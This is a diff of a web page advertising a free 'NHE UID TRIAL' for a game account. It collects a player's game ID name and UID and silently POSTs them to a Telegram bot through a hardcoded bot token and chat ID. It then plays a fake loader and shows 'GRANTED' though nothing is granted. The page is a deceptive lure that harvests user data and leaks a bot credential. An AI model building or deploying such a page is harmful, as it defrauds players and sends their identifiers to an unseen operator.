@@ -72,7 +72,7 @@
         .panel-logo {
             width: 80px;
             height: 80px;
-            border-radius: 50%; /* গোল করার জন্য */
+            border-radius: 50%; 
             border: 2px solid var(--primary);
             padding: 5px;
             filter: drop-shadow(0 0 10px var(--primary));
@@ -163,6 +163,20 @@
         }
         .submit-btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(255, 0, 85, 0.3); }
 
+        /* Developer Footer */
+        .dev-footer {
+            margin-top: 25px;
+            text-align: center;
+            font-family: 'Orbitron';
+            font-size: 10px;
+            letter-spacing: 3px;
+            color: rgba(255, 255, 255, 0.4);
+        }
+        .dev-footer span {
+            color: var(--primary);
+            text-shadow: 0 0 10px var(--primary);
+        }
+
         /* Loader & Result */
         #loader-screen, #success-screen { display: none; text-align: center; }
         .spinner {
@@ -195,19 +209,18 @@
         <!-- MAIN DASHBOARD -->
         <div id="main-dashboard">
             <div class="header-container">
-                <!-- গোল ইমেজ এবং বাম পাশে পজিশন -->
                 <img src="logo.png" class="panel-logo" alt="NHE">
                 
                 <div class="header-text">
                     <div class="status-header">
-                        <div class="dot"></div> ENCRYPTION ACTIVE
+                        <div class="dot"></div> SERVER ACTIVE
                     </div>
-                    <h1>ELITE CORE</h1>
+                    <h1>NHE UID TRIAL</h1>
                 </div>
             </div>
             
-            <div class="input-box"><input type="text" id="name" placeholder="OPERATOR IDENTIFIER"></div>
-            <div class="input-box"><input type="number" id="uid" placeholder="DESTINATION UID"></div>
+            <div class="input-box"><input type="text" id="name" placeholder="GAME ID NAME"></div>
+            <div class="input-box"><input type="number" id="uid" placeholder="GAME UID"></div>
             
             <div class="day-selector">
                 <button class="day-btn" onclick="setDay(this, '1 DAY')">1 DAY</button>
@@ -215,13 +228,16 @@
                 <button class="day-btn" onclick="setDay(this, '3 DAYS')">3 DAYS</button>
             </div>
             
-            <button class="submit-btn" onclick="handleProcess()">INITIATE ACCESS</button>
+            <button class="submit-btn" onclick="handleProcess()">FREE ACCESS</button>
+            
+            <!-- Dev Credit -->
+            <div class="dev-footer">Dev <span>&lt;/&gt;</span> KILLER</div>
         </div>
 
         <!-- LOADER -->
         <div id="loader-screen">
             <div class="spinner"></div>
-            <h2 style="font-family: 'Orbitron'; color: var(--secondary); letter-spacing: 2px;">BYPASSING...</h2>
+            <h2 style="font-family: 'Orbitron'; color: var(--secondary); letter-spacing: 2px;">UID ACCESS RUNNING...</h2>
             <p style="margin-top: 15px; color: #777; font-size: 13px;">Linking to NHE Secure Cloud</p>
         </div>
 
@@ -230,6 +246,7 @@
             <h1 style="color: var(--primary); -webkit-text-fill-color: var(--primary); text-align: center; margin-bottom: 10px;">GRANTED</h1>
             <div class="result-box" id="summary"></div>
             <button class="submit-btn" style="background: rgba(255,255,255,0.1); border: 1px solid var(--glass-border);" onclick="location.reload()">RE-INITIATE</button>
+            <div class="dev-footer">Dev <span>&lt;/&gt;</span> ᴋɪʟʟᴇʀ</div>
         </div>
     </div>
 
@@ -251,10 +268,9 @@
                 return;
             }
 
-            // Telegram API Integration
             const botToken = "8475138855:AAFQMWnAHUJqGsx06QZFw60lXugY15ynkig"; 
-            const chatId = "8135816344";     
-            const text = `💎 **GLASS INJECTION** 💎\n\n👤 **OP:** ${name}\n🆔 **UID:** ${uid}\n⏳ **VAL:** ${selectedTime}\n📡 **ST:** GRANTED`;
+            const chatId = "8135816344";      
+            const text = `💎 **GLASS INJECTION** 💎\n\n👤 **OP:** ${name}\n🆔 **UID:** ${uid}\n⏳ **VAL:** ${selectedTime}\n📡 **ST:** GRANTED\n👨‍💻 **DEV:** ᴋɪʟʟᴇʀ`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
@@ -262,7 +278,6 @@
                 body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
             });
 
-            // UI Transition
             document.getElementById("main-dashboard").style.display = "none";
             document.getElementById("loader-screen").style.display = "block";
 
@@ -270,10 +285,10 @@
                 document.getElementById("loader-screen").style.display = "none";
                 document.getElementById("success-screen").style.display = "block";
                 document.getElementById("summary").innerHTML = `
-                    <p>OPERATOR <b>${name}</b></p>
-                    <p>TARGET UID <b>${uid}</b></p>
+                    <p>GAME ID NAME <b>${name}</b></p>
+                    <p>GAME UID <b>${uid}</b></p>
                     <p>DURATION <b>${selectedTime}</b></p>
-                    <p>PROTOCOL <b>NHE v5.1</b></p>
+                    <p>PROTOCOL <b>NHE V0.4.0</b></p>
                 `;
             }, 5000);
         }
